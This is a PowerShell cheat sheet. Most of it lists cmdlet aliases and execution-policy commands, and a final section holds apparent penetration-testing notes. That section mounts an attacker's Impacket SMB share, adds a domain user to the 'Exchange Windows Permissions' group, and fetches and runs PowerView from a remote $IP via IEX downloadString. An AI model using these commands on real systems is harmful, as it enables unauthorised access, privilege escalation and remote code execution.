| Command let                         | Description/Alias |              |
| ----------------------------------- | ----------------- | ------------ |
| `Get-ChildItem`                     | ls, dir           |              |
| `Get-Alias` or `gal`                | Display all alias |              |
| `Set-Location`                      | cd                |              |
| `Get-Content`                       | cat, type         |              |
| `Clear-Host`                        | cls, clear        |              |
| `New-Item -ItemType File test.txt`  | touch test.txt    |              |
| `New-Item -ItemType Directory test` | mkdir test        |              |
| `Copy-Item`                         | cp, copy          |              |
| `Move-Item`                         | mv                |              |
| `Remove-Item`                       | rm, del, rmdir    |              |
| `Invoke-WebRequest`                 | curl              |              |
| `Out-Null`                          | /dev/null         |              |
| `Out-File`                          | echo test         | tee file.txt |
| `WriteOut`                          | echo              |              |

##### Profile file
`C:\Users\Bob\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1` 

### Code Snippets
##### Write stdout to a file
```powershell
Write-Output hello | Out-File .\test.txt
```

##### Execution Policies
__Get Execution Policy__
```powershell
Get-ExecutionPolicy -List
```
__Set Execution Policy__
Required administration privileges
```powershell
Set-ExecutionPolicy RemoteSigned
```
##### PSDrive powershell Drive
```powershell
Get-PSDrive
```
__All variabels__
```powershell
cd variable:
cd Env:
```



---
##### Mount SMB on Windows from Linux
__Start Impacket's SMB server__
```bash
smbserver.py kick-share $(pwd) -smb2support -user kickass101 -password pass
```
__Create Credential Object__
```powershell
$pass = convertto-securestring 'pass' -AsPlainText -Force
```
```powershell
$creds = New-Object System.Management.Automation.PSCredential('kickass101', $pass)
```
__Mount the SMB share__
```powershell
New-PSDrive -Name kick-share -PSProvider FileSystem -Credential $creds -Root \\$IP\kick-share
```
```powershell
cd kick-share:
```
##### Create and add user to a group
__Create User acct__
```powershell
net user kickass101 Password321 /add /domain
```
__Add user to a group__
```powershell
net group "Exchange Windows Permissions" /add kickass101
```

##### Download files from server
```powershell
IEX(New-Object Net.WebClient).downloadString('http://'+$IP+'/PowerView.ps1')
```
```powershell
 Invoke-WebRequest -Uri $IP/PowerView.ps1 -OutFile powerview.ps1
```
